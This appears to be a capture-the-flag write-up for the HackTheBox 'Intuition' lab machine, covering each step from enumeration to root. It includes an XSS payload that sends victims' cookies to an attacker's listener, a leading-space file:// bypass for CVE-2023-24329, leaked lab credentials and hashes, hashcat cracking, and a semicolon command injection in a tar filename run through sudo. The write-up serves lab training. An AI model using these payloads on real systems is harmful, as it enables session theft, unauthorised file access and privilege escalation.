# HTB – Intuition
### TL;DR
This is an Ubuntu 22.04 machine used for bug reporting via web forms. We can gain access to the web application admin dashboard by stealing cookies with XSS payloads. The we exploit CVE-2023-24329 in Python-URLlib 3.11 to explore the file system and find an SSH private key which allows obtaining the user flag. Regarding escalation, first we move laterally to another user, then we do reveresing on a custom binary to discover it is vulnerable to command injection.

### KEYWORDS
XSS, CVE-2023-24329, Python-URLlib 3.11, Hashcat mask attacks, Ghidra, reversing, command injection.

### REFERENCES
https://www.cvedetails.com/cve/CVE-2023-24329/<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-28 17:04 EDT
Nmap scan report for 10.10.11.15
Host is up, received user-set (0.036s latency).
Not shown: 57729 closed tcp ports (conn-refused), 7804 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv -n       
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-28 17:05 EDT
Nmap scan report for 10.10.11.15
Host is up, received user-set (0.034s latency).
Scanned at 2024-04-28 17:05:24 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3a8f75d60e86616ca92f676bab833c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
|   256 07ef11a6a07d2b4de868791a7ba7a9cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```
Fuzz for subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404,301 -t 100 -u http://comprezzor.htb -H "Host: FUZZ.comprezzor.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://comprezzor.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,301
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 43ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 52ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 48ms]
:: Progress: [4989/4989] :: Job [1/1] :: 237 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

### USER
Add to hosts file. Navigate to http://report.comprezzor.htb and click on "Report bug" (you'll need to sign up a new account).

![Untitled](https://github.com/user-attachments/assets/a8108371-326b-44fe-bfc1-fc918cb500c8)

The report submission form is vulnerable to XSS in both "Title" and "Description" boxes. Insert this payload to steal a cookie.
```javascript
<script>new Image().src="http://10.10.xxx.xxx/dummy.php?output="+document.cookie;</script>
```
A cookie encoded in base64 is received on the listener, after decoding it we see it belongs to user "adam".

![Untitled2](https://github.com/user-attachments/assets/c5267d3f-c5c9-43bb-9b42-9b6bbf5613c9)

Use the cookie to login as "adam" and navigate to http://dashboard.comprezzor.htb, a list of reported bugs comes into view.

![Untitled4](https://github.com/user-attachments/assets/f9a4a7e8-1f9e-4e29-ae25-0744637787e8)

Click on each report ID to browse the incident data.

![Untitled5](https://github.com/user-attachments/assets/55ea9e89-df86-4b5b-ab1c-099bd85dab3a)

The report will be read by the admin as long as priority is set to 1. Adam has permission to change priorities so using his credentials (i.e. his cookie) we will send another report with the same XSS payload. Then set the priority to 1, it will be read by the admin and we will be able to steal admin's cookie.

![Untitled19](https://github.com/user-attachments/assets/42c84bc7-09f9-4d9f-9d62-f1f9a890c486)

Shortly after, admin's cookie is received on the listener.

![Untitled7](https://github.com/user-attachments/assets/e7bdeaa6-1181-4eb5-b3af-a44d2697dd85)

Use the cookie to log in as admin, now a new functionality to generate PDFs comes into view.

![Untitled20](https://github.com/user-attachments/assets/7187b1d8-a3d7-45da-b97d-23d8b7d13fc3)

To application takes a URL and converts its contents to PDF. Start an HTTP server and enter your IP in the URL field, capture the traffic with Wireshark and inspect it. In the HTTP headers we see the host is using `python-urllib 3.11`

![Untitled9](https://github.com/user-attachments/assets/776cb580-85be-444b-a676-f07e20c01111)

There is a CVE-2023-24329 (https://www.cvedetails.com/cve/CVE-2023-24329/) affecting this software. Description reads: "Attackers can bypass blocklisting methods by supplying a URL that starts with blank characters". Let's try using this payload ` file:///etc/os-release` (note there is with a blank space at the beginning).

![Untitled11](https://github.com/user-attachments/assets/39084a2b-5e9e-4c2d-9071-b0cde72b2a3c)

The application dumps the OS info, so the vulnerability is confirmed.

![Untitled10](https://github.com/user-attachments/assets/5e1f7ec5-cc4b-4e2e-b192-c02c6bbab75f)

Let's enumerate the file system to find useful info. First, list the running process (remember there is a blank space at the beginnig of the payloads).
```markdown
 file:///proc/self/cmdline
 
python3/app/code/app.py
```
Inspect the application source code.
```python
 file:///app/code/app.py
 
from flask
import Flask, request, redirect from blueprints.index.index
import main_bp from blueprints.report.report
import report_bp from blueprints.auth.auth
import auth_bp from blueprints.dashboard.dashboard
import dashboard_bp
app = Flask(__name__) app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024 # Limit file size to 5 MB ALLOWED_EXTENSIONS = {
    'txt',
    'pdf',
    'docx'
}
# Add more allowed file extensions
if needed app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain = 'report') app.register_blueprint(auth_bp, subdomain = 'auth')
app.register_blueprint(dashboard_bp, subdomain = 'dashboard') if __name__ == '__main__': app.run(debug = False,
    host = "0.0.0.0", port = 80)
```
We see calls to Python libraries. Inspect all of them.
```markdown
 file:///app/code/blueprints/auth/auth.py
 file:///app/code/blueprints/index/index.py
 file:///app/code/blueprints/report/report.py
 file:///app/code/blueprints/dashboard/dashboard.py
```
In the last one (`dashboard.py`) we find FTP credentials.
```python
from flask
import Blueprint, request, render_template, flash, redirect, url_for, send_file from blueprints.auth.auth_utils
import admin_required, login_required, deserialize_user_data from
blueprints.report.report_utils
import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report
import random, os, pdfkit, socket, shutil
import urllib.request from urllib.parse
import urlparse
import zipfile from ftplib
import FTP from datetime
import datetime dashboard_bp = Blueprint('dashboard', __name__,
    subdomain = 'dashboard') pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports') allowed_hostnames = ['report.comprezzor.htb'] @dashboard_bp.route('/', methods = ['GET'])
@admin_required def dashboard(): user_data = request.cookies.get('user_data') user_info = deserialize_user_data(user_data) if user_info['role'] == 'admin': reports = get_report_by_priority(1)
elif user_info['role'] == 'webdev': reports = get_all_reports() return render_template('dashboard/dashboard.html', reports = reports, user_info = user_info) @dashboard_bp.route('/report/',
    methods = ['GET']) @login_required def get_report(report_id): user_data = request.cookies.get('user_data') user_info = deserialize_user_data(user_data) if user_info['role'] in ['admin', 'webdev']:
    report = get_report_by_id(report_id) return render_template('dashboard/report.html', report = report, user_info = user_info)
else: pass @dashboard_bp.route('/delete/', methods = ['GET'])
@login_required def del_report(report_id): user_data = request.cookies.get('user_data') user_info = deserialize_user_data(user_data) if user_info['role'] in ['admin', 'webdev']: report =
    delete_report(report_id) return redirect(url_for('dashboard.dashboard'))
else: pass @dashboard_bp.route('/resolve', methods = ['POST']) @login_required def resolve(): report_id =
    int(request.args.get('report_id')) if resolve_report(report_id): flash('Report resolved successfully!', 'success')
else: flash('Error occurred while trying to resolve!', 'error') return
redirect(url_for('dashboard.dashboard')) @dashboard_bp.route('/change_priority', methods = ['POST']) @admin_required def change_priority(): user_data = request.cookies.get('user_data')
user_info = deserialize_user_data(user_data) if user_info['role'] != ('webdev'
    or 'admin'): flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error') return
redirect(url_for('dashboard.dashboard')) report_id = int(request.args.get('report_id')) priority_level = int(request.args.get('priority_level')) if change_report_priority(report_id, priority_level):
    flash('Report priority level changed!', 'success')
else: flash('Error occurred while trying to change the priority!', 'error') return redirect(url_for('dashboard.dashboard'))
@dashboard_bp.route('/create_pdf_report', methods = ['GET', 'POST']) @admin_required def create_pdf_report(): global pdf_report_path
if request.method == 'POST': report_url =
    request.form.get('report_url') try: scheme = urlparse(report_url).scheme hostname = urlparse(report_url).netloc
try: dissallowed_schemas = ["file", "ftp", "ftps"]
if (scheme not in
    dissallowed_schemas) and((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or(hostname in allowed_hostnames)): print(scheme) urllib_request = urllib.request.Request(report_url,
        headers = {
            'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM
            response = urllib.request.urlopen(urllib_request) html_content = response.read().decode('utf-8') pdf_filename = f '{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
            pdfkit.from_string(html_content, pdf_filename) return send_file(pdf_filename, as_attachment = True) except: flash('Unexpected error!', 'error') return
            render_template('dashboard/create_pdf_report.html') else: flash('Invalid URL', 'error') return render_template('dashboard/create_pdf_report.html') except Exception as e: raise e
            else: return
            render_template('dashboard/create_pdf_report.html') @dashboard_bp.route('/backup', methods = ['GET']) @admin_required def backup(): source_directory =
                os.path.abspath(os.path.dirname(__file__) + '../../../') current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") backup_filename = f 'app_backup_{current_datetime}.zip'
            with
            zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: for root,
            _,
            files in os.walk(source_directory): for file in files: file_path = os.path.join(root, file) arcname =
                os.path.relpath(file_path, source_directory) zipf.write(file_path, arcname = arcname) try: ftp = FTP('ftp.local') ftp.login(user = 'ftp_admin', passwd = 'u3jai8y71s2') ftp.cwd('/') with
            open(backup_filename, 'rb') as file: ftp.storbinary(f 'STOR {backup_filename}', file) ftp.quit() os.remove(backup_filename) flash('Backup and upload completed successfully!', 'success') except
            Exception as e: flash(f 'Error: {str(e)}', 'error') return redirect(url_for('dashboard.dashboard'))
```
Let's see what is inside the FTP.
```markdown
 ftp://ftp_admin:u3jai8y71s2@ftp.local
 
-rw------- 1 root root 2655 Sep 01 18:40 private-8297.key
-rw-r--r-- 1 root root 15519 Sep 01 18:40 welcome_note.pdf
-rw-r--r-- 1 root root 1732 Sep 01 18:40 welcome_note.txt
```
The `note.txt` is a welcome email from Adam containg the passphrase for the attached private key (`private-8297.key`).<br>
<br>
To find out the username linked to this private key, just generate the correspondent public key and the user name will be added at the end of the resulting key.
```markdown
> ssh-keygen -y -f id_rsa
Enter passphrase: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6udKETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lAKK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BRBdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JXU0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQkTlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbcJFGDBQ+X3QelE= dev_acc@local
```
Use the private key to open an SSH session in the host.

![Untitled13](https://github.com/user-attachments/assets/857da0b4-d958-49ea-b4cc-854d7d21c6e8)

Which can be used to retrieve the user flag.

### ROOT
Start from the low-priv SSH session and take the opportunity to enumerate the user and the system.
```markdown
> whoami && id
dev_acc
uid=1001(dev_acc) gid=1001(dev_acc) groups=1001(dev_acc)

> uname -a && cat /etc/os-release
Linux intuition 6.5.0-27-generic #28~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 15 10:51:06 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
Enumerate local connections, there is an internal FTP server running.
```markdown
> netstat -lnput
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.21.0.1:21           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46483         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:43975           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::60825                :::*                                -
```
Enumerate local users, we find a new user called "lopez".
```markdown
> cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
adam:x:1002:1002:,,,:/home/adam:/bin/bash
dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
```
Navigate to `/var/www/app/blueprints/auth`, there is an SQLite database stored there, browse its contents.
```markdown
> strings users.db
SQLite format 3
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
Etableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT DEFAULT 'user'
indexsqlite_autoindex_users_1users
adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh
adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
adam
        admin
users
```
These are credentials for the internal FTP server. Crack Adam's hash with `hashcat` (module 30120).
```markdown
> hashcat -m 30120 -a 0 -d 1 hash.txt .\rockyou.txt
```
Connect to FTP using Adam's credentials. Inside, we find 2 files, `runner1.c` and  `run-tests.sh`. This is the code of the first one.
```c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}
```
In the C source code we find a hardcoded MD5 hash `0feda17076d793c2ef2870d7427ad4ed` which apparently is used to launch Ansible playbooks.<br>
<br>
Let's se what is inside the shell script.
```bash 
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```
Here we see an incomplete password `UHI75GHI****`. Assuming the MD5 hash belongs to the incomplete password, we are able to crack the complete password using a Hashcat mask attack.
```markdown
> hashcat -m 0 -a 3 -d 1 hash.txt .\rockyou.txt UHI75GHI?a?a?a?a

0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
Time.Started.....: Sun Sep 01 22:19:31 2024 (0 secs)
Time.Estimated...: Sun Sep 01 22:19:31 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: UHI75GHI?a?a?a?a [12]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 55834.3 kH/s (2.95ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11796480/81450625 (14.48%)
Rejected.........: 0/11796480 (0.00%)
Restore.Point....: 11010048/81450625 (13.52%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: UHI75GHIX=+k -> UHI75GHIc1GM
Hardware.Mon.#1..: Temp: 45c Util: 98% Core:1126MHz Mem:2505MHz Bus:16

Started: Sun Sep 01 22:19:23 2024
Stopped: Sun Sep 01 22:19:33 2024
```
Take note and continue enumerating the file system. There is a directory in `/opt/runner2` but current user does not have permissions.
```markdown
> cd runner2
-bash: cd: runner2: Permission denied
```
We are going to need to move laterally to another user, and user "lopez" is the only possibility left. In the path `/var/log/suricata` there are several logs compressed in `.gz`, let's hunt for passwords.
```markdown
> zgrep --color=always -iwn pass eve*.gz
eve.json.9.gz:12477:{"timestamp":"2023-09-28T17:44:48.188361+0000","flow_id":1218304978677234,"in_iface":"ens33","event_type":"ftp","src_ip":"192.168.227.229","src_port":45760,"dest_ip":"192.168.227.13","dest_port":21,"proto":"TCP","tx_id":2,"community_id":"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=","ftp":{"command":"PASS","command_data":"Lopezz1992%123","completion_code":["230"],"reply":["Login successful."],"reply_received":"yes"}}
```
Move laterally to "lopez" and verify he has access to directory `/opt/runner2`. We also discover he is a sudoer.
```markdown
> sudo -l
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
```
Inside the `/opt/runner2` directory we find a binay called `runner2`
```markdown
> file runner2
runner2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1d85ed284e278ad7ab92c2208e4d34cbdceec24, for GNU/Linux 3.2.0, not stripped
```
We have already found before the source code for `runner1`, but not for `runner2`, so there is no other option but to do reversing of the binary file.<br>
<br>
Decompile `runner2` with Ghidra and inspect the `main()` function. Here we can draw some conclusions.

![Untitled15](https://github.com/user-attachments/assets/8ac56191-7ea2-46da-b831-956f2176d206)

1. The application takes `role_file` and an `auth_code` as arguments.
2. `auth_code` is sent to function `check_auth()` as argument.
3. Application expects an "action" called "install".
4. `role_file` is sent to function `installRole()` as argument.

Continue and inspect the 2 functions `check_auth()` and `installRole()`<br>
<br>
In `check_auth()` we see the `auth_code` is with the MD5 hash we found before. So there is a high probability this key is the password we have already cracked. 

![Untitled16](https://github.com/user-attachments/assets/03c91e5f-6005-4059-8e49-9fcfc98a122a)

Now let's inspect the `installRole()` function.

![Untitled17](https://github.com/user-attachments/assets/26cb0243-a2fb-4fd7-a6d8-c92ab5975a91)

First, the function checks if the file is in `tar` format. Secondly, we see the application takes `role_file` passes it to the `ansible-galaxy` binary. Since we control this `role_file` parameter and it is used without sanitization, this function may be vulnerable to command injection.<br>
<br>
To summarize, the app takes a user `json` as input, inside this `json` it looks for `role_file` and `auth_code`. The first one must be in `tar` format, the path to this file is not sanitized and therefore the function is vulnerable to command injection. To execute this vulnerable `installRole()` function we have to select the "install" action. Finally, the `auth_code` is needed to execute the binary, and it is the password we cracked before.<br>
<br>
Bearing this info in mind, let's prepare the attack. First create a `json` including a path to a `tar` file. To exploit the command injection we concatenate a command (using a semicolon ";") in the file name.
```json
{
        "run":{
                "action":"install",
                "role_file":"exploit.tar;bash"
        },
        "auth_code":"UHI75GHINKOP"
}
```
Now create a `tar` file containing whatever content, for example, the `json` itself. Make sure it is named after the command injection payload we used int he `json` file.
```markdown
> tar cfv exploit.tar\;bash exploit.json
exploit.json
```
Finally, execute the binary with `sudo`

![Untitled18](https://github.com/user-attachments/assets/4eea1314-766e-4911-9688-05ed9fe50cf7)

You are root.
